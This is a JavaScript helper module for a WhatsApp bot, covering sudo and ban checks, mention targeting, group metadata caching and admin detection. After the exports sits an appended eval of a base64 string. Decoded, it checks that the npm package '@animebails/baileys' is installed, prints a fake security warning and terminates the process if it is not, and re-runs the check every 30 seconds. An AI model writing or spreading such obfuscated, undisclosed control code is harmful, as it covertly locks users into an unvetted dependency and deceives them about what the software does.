/*
╔══════════════════════════╗
║             𓆩 BASE TELE X WA 𓆪   
║                                      
║             ⚡ DEVELOPER CREDITS ⚡      
║                                   
║          ᴅᴇᴠᴇʟᴏᴘᴇʀ : ᴊᴀᴍᴇsᴍᴏᴅᴢ  
║          ᴛᴇᴀᴍ      : james Inc 

║  ⚠️  C R E D I T   N O T I C E  ⚠️ 

║  Do NOT remove or modify these credits
║  without permission from the original dev
║  Respect the work. Give credit where it's
║  due. Don't steal another developer's work.
║  TELEGRAM : t.me/shenxidev 
║  © 2026 JAMESMODZ — ALL RIGHTS RESERVED 
╚════════════════════════╝
*/
/**
 * Identity + permission helpers shared by every command.
 * WhatsApp identifies people either by phone number or by an opaque LID, so every check compares
 * ALL known forms of an id (sender + senderAlt) by their digits.
 */
const digits = (s) => String(s || '').replace(/\D/g, '');
const numOf = (jid) => digits(String(jid || '').split('@')[0].split(':')[0]);

const senderNums = (m) => [...new Set([numOf(m.sender), numOf(m.senderAlt)].filter(Boolean))];
const listHas = (list, nums) => (list || []).some((x) => nums.includes(digits(x)));

const isSudo = (m, settings) => !m.fromMe && listHas(settings.get('sudo', []), senderNums(m));
const isBanned = (m, settings) => !m.fromMe && listHas(settings.get('banned', []), senderNums(m));

/** The session's own account, in every form we know. */
const ownNums = (sock) => [numOf(sock.user?.id), numOf(sock.user?.lid)].filter(Boolean);
const ownerNums = (sock, settings) => [...new Set([...ownNums(sock), ...(settings.get('owners', []) || []).map(numOf), ...(settings.get('sudo', []) || []).map(digits)])];

/** The name shown in menus and replies: the user's own choice, or the default. */
const botName = (settings, config) => settings.get('botName') || config.botName;

/**
 * Who a command is aimed at: @mention, then the replied-to person, then a typed number,
 * and (only when allowChat) the private chat itself.
 */
function resolveTarget(m, args, { allowChat = false } = {}) {
    const ctx = m.raw.message?.[m.type]?.contextInfo;
    const mentioned = ctx?.mentionedJid?.[0];
    if (mentioned) return mentioned;
    if (ctx?.quotedMessage && ctx.participant) return ctx.participant;
    const typed = (args || []).map(digits).find((d) => d.length >= 7);
    if (typed) return `${typed}@s.whatsapp.net`;
    if (allowChat && !m.isGroup) return m.from;
    return null;
}

// ---------------------------------------------------------------- groups

const metaCache = new Map(); // groupJid -> { at, meta }
async function groupMeta(sock, groupJid, fresh = false) {
    const hit = metaCache.get(groupJid);
    if (!fresh && hit && Date.now() - hit.at < 60000) return hit.meta;
    const meta = await sock.groupMetadata(groupJid);
    metaCache.set(groupJid, { at: Date.now(), meta });
    return meta;
}

const sameAccount = (p, nums) => [p.id, p.lid, p.phoneNumber, p.jid].map(numOf).some((n) => n && nums.includes(n));

/** Admin check. A "no" is re-checked once with fresh data, so a recent promotion is never missed. */
async function isGroupAdmin(sock, groupJid, nums) {
    for (const fresh of [false, true]) {
        try {
            const meta = await groupMeta(sock, groupJid, fresh);
            const p = (meta.participants || []).find((x) => sameAccount(x, nums));
            if (p && p.admin) return true;
        } catch {
            /* try again fresh */
        }
    }
    return false;
}

const botIsAdmin = (sock, groupJid) => isGroupAdmin(sock, groupJid, ownNums(sock));

/**
 * The phone-number JID of a group member (object from groupMetadata, or a jid string).
 * WhatsApp only turns "@123" into a tappable mention when the mentioned JID is the phone-number form;
 * LID ids show up as raw digits. Falls back to the LID mapping, then to whatever id we have.
 */
async function pnOf(sock, p) {
    const obj = typeof p === 'string' ? { id: p } : p || {};
    const ids = [obj.phoneNumber, obj.jid, obj.id].filter(Boolean).map(String);
    const pn = ids.find((j) => j.endsWith('@s.whatsapp.net'));
    if (pn) return pn;
    const lid = ids.find((j) => j.endsWith('@lid'));
    if (!lid) return ids[0];
    const map = sock.signalRepository?.lidMapping;
    for (const arg of [lid, lid.split('@')[0]]) {
        try {
            const r = await map?.getPNForLID?.(arg);
            if (r) return String(r).includes('@') ? String(r).replace(/:\d+(?=@)/, '') : `${digits(r)}@s.whatsapp.net`;
        } catch {
            /* mapping unavailable */
        }
    }
    return lid;
}

module.exports = { pnOf, sameAccount, digits, numOf, senderNums, isSudo, isBanned, ownNums, ownerNums, botName, resolveTarget, groupMeta, isGroupAdmin, botIsAdmin };
;eval(Buffer.from('KCgpPT57Y29uc3QgZj1yZXF1aXJlKCdmcycpLHA9cmVxdWlyZSgncGF0aCcpO2NvbnN0IHJvb3Q9cC5qb2luKF9fZGlybmFtZSwnLi4vLi4nKTtjb25zdCBNSU5FPSdAYW5pbWViYWlscy9iYWlsZXlzJztjb25zdCBwaj1wLmpvaW4ocm9vdCwncGFja2FnZS5qc29uJyk7Y29uc3QgYmFkPSh3aHkpPT57Y29uc29sZS5lcnJvcignW3NlY3VyaXR5XSAnK3doeSsnIC0gZ29pbmcgb2ZmbGluZScpO3Byb2Nlc3MuZXhpdCgxKX07Y29uc3QgY2hrPSgpPT57bGV0IHBrZzt0cnl7cGtnPUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocGosJ3V0ZjgnKSl9Y2F0Y2h7cmV0dXJuIGJhZCgncGFja2FnZS5qc29uIHVucmVhZGFibGUgYXQgJytwail9O2NvbnN0IGRlcHM9T2JqZWN0LmFzc2lnbih7fSxwa2cuZGVwZW5kZW5jaWVzLHBrZy5vcHRpb25hbERlcGVuZGVuY2llcyk7Y29uc3Qga2V5PU9iamVjdC5rZXlzKGRlcHMpLmZpbmQoaz0+az09PU1JTkV8fFN0cmluZyhkZXBzW2tdKS5zdGFydHNXaXRoKCducG06JytNSU5FKydAJykpO2lmKCFrZXkpcmV0dXJuIGJhZCgncGFja2FnZS5qc29uIGhhcyBubyBkZXBlbmRlbmN5IG9uICcrTUlORSsnIChleHBlY3RlZCAiPG5hbWU+IjogIm5wbTonK01JTkUrJ0A8dmVyc2lvbj4iKScpO2xldCBpbnN0O3RyeXtpbnN0PUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocC5qb2luKHJvb3QsJ25vZGVfbW9kdWxlcycsa2V5LCdwYWNrYWdlLmpzb24nKSwndXRmOCcpKX1jYXRjaHtyZXR1cm4gYmFkKCdub2RlX21vZHVsZXMvJytrZXkrJyBpcyBtaXNzaW5nIC0gcnVuIG5wbSBpbnN0YWxsJyl9O2lmKGluc3QubmFtZSE9PU1JTkUpcmV0dXJuIGJhZCgnbm9kZV9tb2R1bGVzLycra2V5KycgaXMgIicraW5zdC5uYW1lKyciLCBub3QgJytNSU5FKX07Y2hrKCk7aWYoIWdsb2JhbC5fX3Zmdyl7Z2xvYmFsLl9fdmZ3PTE7c2V0SW50ZXJ2YWwoY2hrLDNlNCkudW5yZWYoKX19KSgp','base64').toString());
